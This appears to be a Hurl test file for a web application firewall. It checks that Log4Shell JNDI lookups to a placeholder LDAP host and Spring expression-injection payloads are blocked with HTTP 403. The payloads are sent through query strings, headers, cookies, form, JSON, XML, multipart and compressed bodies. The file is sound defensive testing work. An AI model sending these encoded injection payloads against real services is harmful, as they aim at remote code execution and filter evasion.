X-Hurl-Case: extra-spel--text-after
HTTP 200


# extra-spel--xml | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--xml
Content-Type: application/xml
```
<root><value>${T(java.lang.Runtime).getRuntime()}</value></root>
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--xml-after
HTTP 200


# extra-spel--multipart | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0KJHtUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCl9DQotLUh1cmxCb3VuZGFyeS0tDQo=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--multipart-after
HTTP 200


# extra-spel--gzip | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACqtWSkksSVSyqlYqS8wpTS1WsopWyssvyk3MUdJRUqkO0chKLEvUy0nMS9cLKs0rycxN1dRLTy2BsjU0a5Via2sBWyU4FEUAAAA=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--gzip-after
HTTP 200


# extra-spel--deflate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJyrVkpJLElUsqpWKkvMKU0tVrKKVsrLL8pNzFHSUVKpDtHISixL1MtJzEvXCyrNK8nMTdXUS08tgbI1NGuVYmtrATV5F/Q=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--deflate-after
HTTP 200


# extra-spel--br | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--br
Content-Type: application/json
Content-Encoding: br
base64,CyKAeyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCIke1QoamF2YS5sYW5nLlJ1bnRpbWUpLmdldFJ1bnRpbWUoKX0iXX19Aw==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--br-after
HTTP 200


# extra-log4j--query | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--query-before
HTTP 200

GET {{base_url}}/probe?q=%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D
X-Hurl-Case: extra-log4j--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--query-after
HTTP 200


# extra-log4j--query-double | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--query-double-before
HTTP 200

GET {{base_url}}/probe?q=%2524%257Bjndi%253Aldap%253A%252F%252Fexample.invalid%252Fa%257D
X-Hurl-Case: extra-log4j--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--query-double-after
HTTP 200


# extra-log4j--query-duplicate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D
X-Hurl-Case: extra-log4j--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--query-duplicate-after
HTTP 200


# extra-log4j--header | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-log4j--header
X-Probe: %24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--header-after
HTTP 200


# extra-log4j--cookie | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-log4j--cookie
Cookie: probe=%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--cookie-after
HTTP 200


# extra-log4j--form | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--form
Content-Type: application/x-www-form-urlencoded
```
q=%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--form-after
HTTP 200


# extra-log4j--json | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--json
Content-Type: application/json
```
{"data":{"values":["normal","${jndi:ldap://example.invalid/a}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--json-after
HTTP 200


# extra-log4j--json-put | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: extra-log4j--json-put
Content-Type: application/json
```
{"data":{"values":["normal","${jndi:ldap://example.invalid/a}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--json-put-after
HTTP 200


# extra-log4j--json-patch | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: extra-log4j--json-patch
Content-Type: application/json
```
{"data":{"values":["normal","${jndi:ldap://example.invalid/a}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--json-patch-after
HTTP 200


# extra-log4j--text | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--text
Content-Type: text/plain
```
${jndi:ldap://example.invalid/a}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--text-after
HTTP 200


# extra-log4j--xml | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--xml
Content-Type: application/xml
```
<root><value>${jndi:ldap://example.invalid/a}</value></root>
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--xml-after
HTTP 200


# extra-log4j--multipart | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0KJHtqbmRpOmxkYXA6Ly9leGFtcGxlLmludmFsaWQvYX0NCi0tSHVybEJvdW5kYXJ5LS0NCg==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--multipart-after
HTTP 200


# extra-log4j--gzip | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACgXBSwqAMAwFwLs8XIrd5yri4kG6iKQf/BQh9O7OBJQPIYFBf/MN2VHbVehYscRZ1cSVXVLKH0v3vFkddNPEiWPOH2ocuXZBAAAA;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--gzip-after
HTTP 200


# extra-log4j--deflate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJwFwUsKgDAMBcC7PFyK3ecq4uJBuoikH/wUIfTuzgSUDyGBQX/zDdlR21XoWLHEWdXElV1Syh9L97xZHXTTxIljzh/eMRbR;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--deflate-after
HTTP 200


# extra-log4j--br | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-log4j--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-log4j--br
Content-Type: application/json
Content-Encoding: br
base64,G0AAAARkc6mPx3O7qZ4HweI58i7CBpyAp2lAg/gwOXyOiNgoILSIhG7sz2TUTQ99bl9F/ndFTrVizekG;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-log4j--br-after
HTTP 200


